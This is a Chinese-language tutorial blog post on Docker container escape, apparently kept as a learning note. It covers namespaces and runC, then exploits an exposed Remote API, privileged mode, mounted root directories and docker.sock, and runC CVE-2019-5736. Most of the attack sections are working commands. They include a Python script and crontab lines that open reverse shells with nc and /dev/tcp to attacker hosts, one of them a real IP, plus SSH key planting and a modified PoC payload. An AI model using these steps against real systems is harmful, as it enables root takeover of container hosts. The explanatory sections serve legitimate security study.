<p>RunC 是一个轻量级的工具，它是用来运行容器的，容器作为 runC 的子进程开启，在不需要运行一个 Docker daemon 的情况下可以嵌入到其他各种系统，也就是说可以不用通过 docker 引擎，直接运行容器。docker是通过Containerd调用 runC 运行容器的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/docker-runc</span><br></pre></td></tr></table></figure>


<p><strong>命名空间</strong><br>命名空间（Linux namespace）是linux内核针对实现容器虚拟化映入的一个特性。我们创建的每个容器都有自己的命名空间，运行在其中的应用都像是在独立的操作系统中运行一样，命名空间保证了容器之间互不影响。</p>
<p>Linux的命名空间机制提供了一种资源隔离的解决方案。PID,IPC,Network等系统资源不再是全局性的，而是属于特定的Namespace。Namespace是对全局系统资源的一种封装隔离，使得处于不同namespace的进程拥有独立的全局系统资源，改变一个namespace中的系统资源只会影响当前namespace里的进程，对其他namespace中的进程没有影响。</p>
<p>传统上，在Linux以及其他衍生的UNIX变体中，许多资源是全局管理的。例如，系统中的所有进程按照惯例是通过PID标识的，这意味着内核必须管理一个全局的PID列表。而且，所有调用者通过uname系统调用返回的系统相关信息（包括系统名称和有关内核的一些信息）都是相同的。用户ID的管理方式类似，即各个用户是通过一个全局唯一的UID号标识。</p>
<p>全局ID使得内核可以有选择地允许或拒绝某些特权。虽然UID为0的root用户基本上允许做任何事，但其他用户ID则会受到限制。例如UID为n的用户，不允许杀死属于用户m的进程（ m≠ n）。但这不能防止用户看到彼此，即用户n可以看到另一个用户m也在计算机上活动。只要用户只能操纵他们自己的进程，这就没什么问题，因为没有理由不允许用户看到其他用户的进程。</p>
<p>但有些情况下，这种效果可能是不想要的。如果提供Web主机的供应商打算向用户提供Linux计算机的全部访问权限，包括root权限在内。传统上，这需要为每个用户准备一台计算机，代价太高。使用KVM或VMWare提供的虚拟化环境是一种解决问题的方法，但资源分配做得不是非常好。计算机的各个用户都需要一个独立的内核，以及一份完全安装好的配套的用户层应用。</p>
<p>命名空间提供了一种不同的解决方案，所需资源较少。在虚拟化的系统中，一台物理计算机可以运行多个内核，可能是并行的多个不同的操作系统。而命名空间则只使用一个内核在一台物理计算机上运作，前述的所有全局资源都通过命名空间抽象起来。这使得可以将一组进程放置到容器中，各个容器彼此隔离。隔离可以使容器的成员与其他容器毫无关系。但也可以通过允许容器进行一定的共享，来降低容器之间的分隔。例如，容器可以设置为使用自身的PID集合，但仍然与其他容器共享部分文件系统。</p>
<p><strong>PID 命名空间</strong></p>
<p>不同用户的进程就是通过 pid 命名空间隔离开的，且不同命名空间中可以有相同 pid。在同一个Namespace中只能看到当前命名空间的进程。所有的 LXC 进程在 Docker 中的父进程为Docker进程，每个 LXC 进程具有不同的命名空间。同时由于允许嵌套，因此可以很方便的实现嵌套的 Docker 容器。</p>
<p><strong>NET 命名空间</strong></p>
<p>有了 pid 命名空间, 每个命名空间中的 pid 能够相互隔离，但是网络端口还是共享 host 的端口。网络隔离是通过 net 命名空间实现的， 每个 net 命名空间有独立的网络设备, IP 地址, 路由表, &#x2F;proc&#x2F;net 目录。这样每个容器的网络就能隔离开来。Docker 默认采用 veth 的方式，将容器中的虚拟网卡同 host 上的一 个Docker 网桥 docker0 连接在一起。</p>
<p><strong>IPC 命名空间</strong></p>
<p>容器中进程交互还是采用了 Linux 常见的进程间交互方法(interprocess communication – IPC), 包括信号量、消息队列和共享内存等。然而同 VM 不同的是，容器的进程间交互实际上还是 host 上具有相同 pid 命名空间中的进程间交互，因此需要在 IPC 资源申请时加入命名空间信息，每个 IPC 资源有一个唯一的 32 位 id。</p>
<p><strong>MNT 命名空间</strong></p>
<p>类似 chroot，将一个进程放到一个特定的目录执行。mnt 命名空间允许不同命名空间的进程看到的文件结构不同，这样每个命名空间 中的进程所看到的文件目录就被隔离开了。同 chroot 不同，每个命名空间中的容器在 &#x2F;proc&#x2F;mounts 的信息只包含所在命名空间的 mount point。</p>
<p><strong>UTS 命名空间</strong></p>
<p>UTS(“UNIX Time-sharing System”) 命名空间允许每个容器拥有独立的 hostname 和 domain name, 使其在网络上可以被视作一个独立的节点而非 主机上的一个进程。</p>
<p><strong>USER 命名空间</strong></p>
<p>每个容器可以有不同的用户和组 id, 也就是说可以在容器内用容器内部的用户执行程序而非主机上的用户。</p>
<p><strong>伪文件系统</strong><br>Linux内核提供了procfs、sysfs和devfs等文件系统,伪文件系统存在于内存中，通常不占用硬盘空间，它以文 件的形式，向用户提供了访问系统内核数据的接口。用户和应用程序 可以通过访问这些数据接口，得到系统的信息，而且内核允许用户修改内核的某些参数。</p>
<p>procfs是Linux内核信息的抽象文件接口，大量内核中的信息以及可调参数都被作为常规文件映射到一个目录树中，这样我们就可以简单直接的通过echo或cat这样的文件操作命令对系统信息进行查取和调整了。同时procfs也提供了一个接口，使得我们自己的内核模块或用户态程序可以通过procfs进行参数的传递。在当今的Linux系统中，大量的系统工具也通过procfs获取内核参数，例如ps、 lspci等等，没有procfs它们将可能不能正常工作。</p>
<p><strong>定时任务</strong><br>通过crontab 命令，我们可以在固定的间隔时间执行指定的系统指令或 shell script脚本。时间间隔的单位可以是分钟、小时、日、月、周及以上的任意组合。这个命令非常适合周期性的日志分析或数据备份等工作。</p>
<p>我们经常使用的是crontab命令是cron table的简写，它是cron的配置文件，也可以叫它作业列表，我们可以在以下文件夹内找到相关配置文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/spool/cron/ 目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名</span><br><span class="line">/etc/crontab 这个文件负责调度各种管理和维护任务。</span><br><span class="line">/etc/cron.d/ 这个目录用来存放任何要执行的crontab文件或脚本。</span><br></pre></td></tr></table></figure>


<p>我们还可以把脚本放在&#x2F;etc&#x2F;cron.hourly、&#x2F;etc&#x2F;cron.daily、&#x2F;etc&#x2F;cron.weekly、&#x2F;etc&#x2F;cron.monthly目录中，让它每小时&#x2F;天&#x2F;星期、月执行一次。</p>
<p><strong>ssh</strong><br><strong>公钥登录</strong></p>
<p>首先用户将自己的公钥存储在需要登录的远程机器上面，然后登录的时候，远程主机会向用户发送一段随机字符串，接着用户使用自己的私钥加密字符串，并发给远程主机。最后，远程主机使用存储的公钥进行解密，若解密成功，则说明用户可信，准许登录，不在提示输入密码。</p>
<p><strong>口令登录</strong></p>
<p>口令登录，即登录的时候需要输入登录密码</p>
<p>客户端向服务器发出请求</p>
<p>服务器将自己的公钥返回给客户端;</p>
<p>客户端用服务器的公钥加密登录信息, 再将信息发送给服务器;</p>
<p>服务器接收到客户端传送的登录信息, 用自己的私钥解码, 如果结果正确, 则同意登录, 建立起连接</p>
<h2 id="逃逸方法"><a href="#逃逸方法" class="headerlink" title="逃逸方法"></a>逃逸方法</h2><p>错误配置<br>由于”纵深防御” 和 “最小权限”等理念和原则落地，越来越难以直接利用漏洞来进行利用。另一方面，公开的漏洞，安全运维人员能够及时将其修复，当然，不免存在漏网之鱼。相反，更多的是利用错误的、危险的配置来进行利用，不仅仅Docker逃逸，其他漏洞也是，比如生产环境开启Debug模式导致漏洞利用等等。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Docker已经将容器运行时的Capabilities黑名单机制改为如今的默认禁止所有Capabilities，再以白名单方式赋予容器运行所需的最小权限</span><br></pre></td></tr></table></figure>

<p>Docker Remote API 未授权访问<br>漏洞简述：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker swarm是管理docker集群的工具。主从管理、默认通过2375端口通信。绑定了一个Docker Remote API的服务，可以通过HTTP、Python、调用API来操作Docker。</span><br><span class="line"></span><br><span class="line">Docker daemon 是服务器组件，以 Linux 后台服务的方式运行，是 Docker 最核心的后台进程，我们也把它称为守护进程。它负责响应来自 Docker Client 的请求，然后将这些请求翻译成系统调用完成容器管理操作。该进程会在后台启动一个 API Server ，负责接收由 Docker Client 发送的请求，接收到的请求将通过Docker daemon 内部的一个路由分发调度，由具体的函数来执行请求。</span><br></pre></td></tr></table></figure>

<p>默认配置下， Docker daemon 只能响应来自本地Host的客户端请求。如果要允许远程客户端请求，需要在配置文件中打开TCP监听。</p>
<p>查找docker.service</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@VM-0-6-ubuntu:~/.ssh# find / -name docker.service</span><br><span class="line">/lib/systemd/system/docker.service</span><br><span class="line">/sys/fs/cgroup/devices/system.slice/docker.service</span><br><span class="line">/sys/fs/cgroup/memory/system.slice/docker.service</span><br><span class="line">/sys/fs/cgroup/pids/system.slice/docker.service</span><br><span class="line">/sys/fs/cgroup/cpu,cpuacct/system.slice/docker.service</span><br><span class="line">/sys/fs/cgroup/blkio/system.slice/docker.service</span><br><span class="line">/sys/fs/cgroup/systemd/system.slice/docker.service</span><br><span class="line">/sys/fs/cgroup/unified/system.slice/docker.service</span><br><span class="line">/var/lib/lxcfs/cgroup/devices/system.slice/docker.service</span><br><span class="line">/var/lib/lxcfs/cgroup/memory/system.slice/docker.service</span><br><span class="line">/var/lib/lxcfs/cgroup/pids/system.slice/docker.service</span><br><span class="line">/var/lib/lxcfs/cgroup/cpu,cpuacct/system.slice/docker.service</span><br><span class="line">/var/lib/lxcfs/cgroup/blkio/system.slice/docker.service</span><br><span class="line">/var/lib/lxcfs/cgroup/name=systemd/system.slice/docker.service</span><br><span class="line">/var/lib/systemd/deb-systemd-helper-enabled/multi-user.target.wants/docker.service</span><br><span class="line">find: ‘/proc/10537/task/10537/net’: Invalid argument</span><br><span class="line">find: ‘/proc/10537/net’: Invalid argument</span><br><span class="line">/etc/systemd/system/multi-user.target.wants/docker.service</span><br></pre></td></tr></table></figure>


<p>添加2375的tcp监听</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock -H tcp://0.0.0.0:2375</span><br></pre></td></tr></table></figure>


<p>重新加载配置并重启docker</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>


<p>远程连接docker</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://&lt;target&gt;:2375/ ps -a</span><br></pre></td></tr></table></figure>


<p>但是这样子是把docker暴露在公网上了，非常不安全，具体安全配置见官网</p>
<p>docker remote api可以执行docker命令，docker守护进程监听在0.0.0.0，可直接调用API来操作docker。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">通过docker daemon api 执行docker命令：</span><br><span class="line"></span><br><span class="line">#列出容器信息，效果与docker ps一致。 </span><br><span class="line">curl http://&lt;target&gt;:2375/containers/json </span><br><span class="line">#启动容器</span><br><span class="line">docker -H tcp://&lt;target&gt;:2375 ps -a</span><br></pre></td></tr></table></figure>

<h3 id="利用场景："><a href="#利用场景：" class="headerlink" title="利用场景："></a>利用场景：</h3><p>通过对宿主机端口扫描，发现有2375端口开放，可以执行任意docker命令。我们可以据此，在宿主机上运行一个容器，然后将宿主机的根目录挂载至docker的&#x2F;mnt目录下，便可以在容器中任意读写宿主机的文件了。我们可以将命令写入crontab配置文件，进行反弹shell。</p>
<p>漏洞利用：</p>
<p>Vulhub提供了该漏洞的复现环境。</p>
<h3 id="利用方法1"><a href="#利用方法1" class="headerlink" title="利用方法1"></a>利用方法1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">随意启动一个容器，并将宿主机的/etc目录挂载到容器中，便可以任意读写文件了。我们可以将命令写入crontab配置文件，进行反弹shell。</span><br><span class="line"></span><br><span class="line">import docker</span><br><span class="line"></span><br><span class="line">client = docker.DockerClient(base_url=&#x27;http://victim-ip:2375/&#x27;)</span><br><span class="line">data = client.containers.run(&#x27;alpine:latest&#x27;, r&#x27;&#x27;&#x27;sh -c &quot;echo &#x27;* * * * * /usr/bin/nc attacker-ip 21 -e /bin/sh&#x27; &gt;&gt; /tmp/etc/crontabs/root&quot; &#x27;&#x27;&#x27;, remove=True, volumes=&#123;&#x27;/etc&#x27;: &#123;&#x27;bind&#x27;: &#x27;/tmp/etc&#x27;, &#x27;mode&#x27;: &#x27;rw&#x27;&#125;&#125;)</span><br></pre></td></tr></table></figure>

<h3 id="利用方法2"><a href="#利用方法2" class="headerlink" title="利用方法2"></a>利用方法2</h3><p>随便启动一个docker,挂载点设置为服务器的根目录挂载至&#x2F;mnt目录下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker -H tcp://&lt;靶机ip&gt;:2375 run -it -v /:/mnt nginx:latest /bin/bash</span><br></pre></td></tr></table></figure>


<p>在容器内执行命令，将反弹shell的脚本写入到&#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;* * * * * /bin/bash -i &gt;&amp; /dev/tcp/&lt;攻击机ip&gt;/12345 0&gt;&amp;1&#x27; &gt;&gt; /mnt/var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>


<p>本地监听端口，获取对方宿主机shell。</p>
<h3 id="利用方法3"><a href="#利用方法3" class="headerlink" title="利用方法3"></a>利用方法3</h3><p><a target="_blank" rel="noopener" href="https://github.com/Tycx2ry/docker_api_vul">https://github.com/Tycx2ry/docker_api_vul</a></p>
<p>Docker 高危启动参数 – privileged 特权模式启动容器<br>docker使用–privileged, –cap-add, –cap-drop 来对容器本身的能力进行开放或限制，使用 –cap-add, –cap-drop 可以添加或禁用特定的权限</p>
<p>–privileged 参数也可以达到开放权限的作用, 与–cap-add的区别就是, –privileged是将所有权限给容器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">由于docker容器的隔离是基于Linux的Capability机制实现的, Linux的Capability机制允许你将超级用户相关的高级权限划分成为不同的小单元. 目前Docker容器默认只用到了以下的Capability</span><br><span class="line"></span><br><span class="line">CHOWN</span><br><span class="line">DAC_OVERRIDE</span><br><span class="line">FSETID</span><br><span class="line">FOWNER</span><br><span class="line">MKNOD</span><br><span class="line">NET_RAW</span><br><span class="line">SETGID</span><br><span class="line">SETUID</span><br><span class="line">SETFCAP</span><br><span class="line">SETPCAP</span><br><span class="line">NET_BIND_SERVICE</span><br><span class="line">SYS_CHROOT</span><br><span class="line">KILL</span><br><span class="line">AUDIT_WRITE</span><br></pre></td></tr></table></figure>

<p>特权模式逃逸是一种最简单有效的逃逸方法，使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，可直接通过chroot切换根目录、写ssh公钥和crontab计划任何等getshell。</p>
<p>当操作者执行docker run –privileged时，Docker将允许容器访问宿主机上的所有设备，同时修改AppArmor或SELinux的配置，使容器拥有与那些直接运行在宿主机上的进程几乎相同的访问权限。</p>
<p>判断方法：</p>
<p>特权模式起的容器，实战可通过cat &#x2F;proc&#x2F;self&#x2F;status |grep Cap命令判断当前容器是否通过特权模式起（CapEff: 000000xfffffffff代表为特权模式起）</p>
<p>利用方法：</p>
<p>特权模式启动一个Ubuntu容器：</p>
<p>sudo docker run -itd –privileged ubuntu:latest &#x2F;bin&#x2F;bash</p>
<p>进入容器使用fdisk -l 命令查看磁盘文件：</p>
<p>fdisk -l命令查看宿主机设备为&#x2F;dev&#x2F;sda5，通过mount命令将宿主机根目录挂载进容器</p>
<p>新建一个目录：mkdir &#x2F;test<br>挂载磁盘到新建目录：mount &#x2F;dev&#x2F;sda5 &#x2F;test<br>切换根目录：chroot &#x2F;test</p>
<p>写计划任务，反弹宿主机Shell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;* * * * * /bin/bash -i &gt;&amp; /dev/tcp/39.106.51.35/1234 0&gt;&amp;1&#x27; &gt;&gt; /test/var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>

<p>如果要写SSH的话，需要挂载宿主机的root目录到容器:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd -v /root:/root ubuntu:18.04 /bin/bashmkdir /root/.sshcat id_rsa.pub &gt;&gt; /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>


<p>然后ssh 私钥登录</p>
<p>其他参数：<br>Docker 通过Linux namespace实现6项资源隔离，包括主机名、用户权限、文件系统、网络、进程号、进程间通讯。但部分启动参数授予容器权限较大的权限，从而打破了资源隔离的界限。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--cap-add=SYS_ADMIN     启动时，允许执行mount特权操作，需获得资源挂载进行利用。    </span><br><span class="line">--net=host              启动时，绕过Network Namespace    </span><br><span class="line">--pid=host              启动时，绕过PID Namespace    </span><br><span class="line">--ipc=host              启动时，绕过IPC Namespace</span><br></pre></td></tr></table></figure>


<p>错误挂载<br>挂载敏感目录（-v &#x2F;😕）<br>将宿主机root目录挂载到容器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd -v /root:/root ubuntu:18.04 /bin/bash</span><br></pre></td></tr></table></figure>


<p>模拟攻击者写入ssh密钥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /root/.sshcat id_rsa.pub &gt;&gt; /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>


<p>利用私钥成功登录。获取宿主机权限。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@&lt;靶机ip&gt;</span><br></pre></td></tr></table></figure>


<p>挂载Docker Socket（docker.sock）<br>使用者将宿主机&#x2F;var&#x2F;run&#x2F;docker.sock文件挂载到容器中，目的是能在容器中也能操作docker。</p>
<h4 id="概述："><a href="#概述：" class="headerlink" title="概述："></a>概述：</h4><p>Docker Socket是Docker守护进程监听的Unix域套接字，用来与守护进程通信查询信息或下发命令。</p>
<p>判断方法：</p>
<p>攻击者获得了 docker 容器的访问权限<br>容器已安装&#x2F;var&#x2F;run&#x2F;docker.sock<br>实战中通过find命令，可查找类似docker.sock等高危目录和文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name docker.sock</span><br></pre></td></tr></table></figure>


<p>相当于在docker里可以执行宿主机docker命令，这样的话，我们新启一个容器，挂载宿主机根目录，即可逃逸</p>
<p>复现：</p>
<p>1、首先创建一个容器并挂载&#x2F;var&#x2F;run&#x2F;docker.sock</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd -v /var/run/docker.sock:/var/run/docker.sock ubuntu</span><br></pre></td></tr></table></figure>

<p>1<br>2、在该容器内安装Docker命令行客户端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-updateapt-get install \apt-transport-https \ca-certificates \curl \gnupg-agent \software-properties-commoncurl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg | apt-key add -apt-key fingerprint 0EBFCD88add-apt-repository \&quot;deb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/ \$(lsb_release -cs) \stable&quot;apt-get updateapt-get install docker-ce docker-ce-cli containerd.i</span><br></pre></td></tr></table></figure>


<p>3、接着使用该客户端通过Docker Socket与Docker守护进程通信，发送命令创建并运行一个新的容器，将宿主机的根目录挂载到新创建的容器内部</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v /:/host ubuntu:latest /bin/bash</span><br></pre></td></tr></table></figure>


<p>4、在新容器内执行chroot将根目录切换到挂载的宿主机根目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chroot /host</span><br></pre></td></tr></table></figure>

<h4 id="已成功逃逸到宿主机"><a href="#已成功逃逸到宿主机" class="headerlink" title="已成功逃逸到宿主机"></a>已成功逃逸到宿主机</h4><p>挂载宿主机procfs<br>将宿主机的procfs挂载到不受控的容器中也是十分危险的，尤其是在该容器内默认启用root权限，且没有开启User Namespace时利用procfs通过写&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;core_pattern来进行逃逸，触发条件比较苛刻，需要有进程崩溃才能触发</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu</span><br></pre></td></tr></table></figure>

<p>1<br>从2.6.19内核版本开始，Linux支持在&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;core_pattern中使用新语法。如果该文件中的首个字符是管道符|，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行。</p>
<p>Docker默认情况下不会为容器开启User Namespace</p>
<p>一般情况下不会将宿主机的procfs挂载到容器中，然而有些业务为了实现某些特殊需要，还是会有。</p>
<h3 id="判断方法："><a href="#判断方法：" class="headerlink" title="判断方法："></a>判断方法：</h3><p>实战中通过find命令，可查找类似core_pattern、&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;core_pattern等高危目录和文件</p>
<h3 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h3><p>在挂载procfs的容器内利用core_pattern后门实现逃逸</p>
<p>利用思路：</p>
<p>还没学会。。。。。。。</p>
<h2 id="程序漏洞"><a href="#程序漏洞" class="headerlink" title="程序漏洞"></a>程序漏洞</h2><p>Shocker 攻击<br>漏洞描述：从Docker容器逃逸并读取到主机某个目录的文件内容。Shocker攻击的关键是执行了系统调用open_by_handle_at函数，Linux手册中特别提到调用open_by_handle_at函数需要具备CAP_DAC_READ_SEARCH能力，而Docker1.0版本对Capability使用黑名单管理策略，并且没有限制CAP_DAC_READ_SEARCH能力，因而引发了容器逃逸的风险。</p>
<p>漏洞影响版本： Docker版本&lt; 1.0， 存在于 Docker 1.0 之前的绝大多数版本</p>
<p>Shocker &#x2F; Docker Breakout PoC</p>
<h2 id="runC容器逃逸漏洞（CVE-2019-5736）"><a href="#runC容器逃逸漏洞（CVE-2019-5736）" class="headerlink" title="runC容器逃逸漏洞（CVE-2019-5736）"></a>runC容器逃逸漏洞（CVE-2019-5736）</h2><p>漏洞简述：</p>
<p>CVE-2019-5736是由波兰的一支ctf战队Dragon Sector在2019发现的关于runc的漏洞。起因是他们在参加一场ctf比赛之后，发现比赛中的一道沙箱逃逸题的原理与runc的实现原理类似。在这之后他们对runc进行了相关的漏洞挖掘工作，并且成功发现了runc中存在的能够被用来覆盖宿主机上runc文件的容器逃逸漏洞，该漏洞的CVE编号为CVE-2019-5736。</p>
<p>利用该漏洞，攻击者可以通过修改容器内可执行文件的方式，获取到宿主机上runc可执行文件的文件句柄，然后进行覆盖操作，将runc替换为可控的恶意文件。最终可造成在宿主机上以root权限执行任意代码的严重后果，实现容器逃逸。</p>
<p>利用条件：</p>
<p>Docker版本 &lt; 18.09.2<br>runc版本&lt; 1.0-rc6<br>漏洞成因：</p>
<p>该漏洞的产生主要和Linux的pid命名空间与&#x2F;proc伪文件系统相关。</p>
<p>当一个进程加入了某一pid命名空间之后，该命名空间中的其它进程就能够通过&#x2F;proc文件系统观察到该进程，在权限允许的情况下，进程能够通过&#x2F;proc&#x2F;[pid]&#x2F;exe找到其它进程对应的二进制文件。</p>
<p>而如果将这种情况放到runc init执行过程中来看，runc init进程在进入了容器的命名空间之后，如果容器内部的文件能够欺骗runc init进程执行自身，那么容器内的进程就能够通过&#x2F;proc获取到宿主机上的runc文件句柄，从而进行覆盖等攻击操作。</p>
<p>正常的创建容器并在容器内执行命令的过程示意图如下图所示</p>
<p>而修改了待执行文件的内容之后，runc init进程会执行自身，从而将宿主机上的runc文件暴露给了容器内部，造成安全风险</p>
<p>我们在执行功能类似于docker exec的命令（其他的如docker run等，不再讨论）时，底层实际上是容器运行时（Runtime）在操作。例如runc，相应地，runc exec命令会被执行。它的最终效果是在容器内部执行用户指定的程序。进一步讲，就是在容器的各种命名空间内，受到各种限制（如cgroups）的情况下，启动一个进程。除此以外，这个操作与宿主机上执行一个程序并无二致。</p>
<p>执行过程大体是这样的：runc启动，加入到容器的命名空间，接着以自身（&#x2F;proc&#x2F;self&#x2F;exe，后面会解释）为范本启动一个子进程，最后通过exec系统调用执行用户指定的二进制程序。</p>
<p>我们需要让另一个角色出场——proc伪文件系统，即&#x2F;proc。关于这个概念，Linux文档已经给出了详尽的说明，这里我们主要关注&#x2F;proc下的两类文件：</p>
<p>&#x2F;proc&#x2F;[PID]&#x2F;exe：它是一种特殊的符号链接，又被称为magic links，指向进程自身对应的本地程序文件（例如我们执行ls，&#x2F;proc&#x2F;[ls-PID]&#x2F;exe就指向&#x2F;bin&#x2F;ls）</p>
<p>&#x2F;proc&#x2F;[PID]&#x2F;fd&#x2F;：这个目录下包含了进程打开的所有文件描述符</p>
<p>&#x2F;proc&#x2F;[PID]&#x2F;exe的特殊之处在于，如果你去打开这个文件，在权限检查通过的情况下，内核将直接返回给你一个指向该文件的描述符（file descriptor），而非按照传统的打开方式去做路径解析和文件查找。这样一来，它实际上绕过了mnt命名空间及chroot对一个进程能够访问到的文件路径的限制。</p>
<p>那么，设想这样一种情况：在runc exec加入到容器的命名空间之后，容器内进程已经能够通过内部&#x2F;proc观察到它，此时如果打开&#x2F;proc&#x2F;[runc-PID]&#x2F;exe并写入一些内容，就能够实现将宿主机上的runc二进制程序覆盖掉。这样一来，下一次用户调用runc去执行命令时，实际执行的将是攻击者放置的指令。</p>
<p>利用步骤：</p>
<p>1、下载poc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Frichetten/CVE-2019-5736-PoC</span><br></pre></td></tr></table></figure>


<p>2、修改Payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi main.gopayload = &quot;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/192.168.172.136/12345 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>


<p>3、编译生成payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</span><br></pre></td></tr></table></figure>


<p>4、实战中可以curl等方式下载，这边直接使用docker cp放入容器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker cp ./main 248f8b7d3c45:/tmp</span><br></pre></td></tr></table></figure>


<p>5、在容器中执行payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">修改权限</span><br><span class="line"></span><br><span class="line">chmod 777 main</span><br><span class="line"></span><br><span class="line">执行Payload</span><br><span class="line"></span><br><span class="line">./main</span><br></pre></td></tr></table></figure>


<p>6、在攻击机上监听本地端口，成功获取宿主机反弹回来的shell</p>
<p>Docker cp 命令容器逃逸攻击漏洞 CVE-2019-14271<br>漏洞描述：</p>
<p>当Docker宿主机使用cp命令时，会调用辅助进程docker-tar，该进程没有被容器化，且会在运行时动态加载一些libnss*.so库。黑客可以通过在容器中替换libnss*.so等库，将代码注入到docker-tar中。当Docker用户尝试从容器中拷贝文件时将会执行恶意代码，成功实现Docker逃逸，获得宿主机root权限。</p>
